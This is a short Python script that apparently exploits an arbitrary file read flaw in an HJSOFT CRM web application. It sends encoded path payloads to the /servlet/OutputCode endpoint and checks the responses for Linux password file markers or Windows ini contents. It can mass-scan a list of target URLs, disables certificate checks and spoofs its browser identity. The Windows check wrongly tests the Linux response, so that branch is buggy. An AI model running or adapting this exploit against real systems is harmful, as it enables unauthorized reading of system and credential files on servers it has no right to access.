import requests,re
import urllib3
import string,random
from urllib.parse import urljoin,quote
import argparse
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls


def check(url):
    url = url.rstrip("/")
    linux_target = urljoin(url,"/servlet/OutputCode?path=RNcrjWtNfJnkUMbX1UB6VAPAATTP3HJDPAATTPPAATTP3HJDPAATTP")
    windows_target = urljoin(url, "/servlet/OutputCode?path=MrEzLLE8pPjFvPfyPAATTP2HJFPAATTPTwqF7eJiXGeHU4B")
    try:
        linux_response = requests.get(linux_target, timeout=15,headers={"User-Agent":"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"},verify=False)
        windows_response = requests.get(windows_target, timeout=15,headers={"User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"},verify=False)

        if linux_response.status_code == 200 and 'root:' in linux_response.text and 'bin' in linux_response.text:
            print(f"\033[31mDiscovered:{url}: linux_HJSOFTCRM_OutputCode_ArbitraryFileRead!\033[0m")
            return True
        if windows_response.status_code == 200 and 'fonts' in linux_response.text and 'extensions' in linux_response.text:
            print(f"\033[31mDiscovered:{url}: windows_HJSOFTCRM_OutputCode_ArbitraryFileRead!\033[0m")
            return True
    except Exception as e:
        pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt

    if url:
        check(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")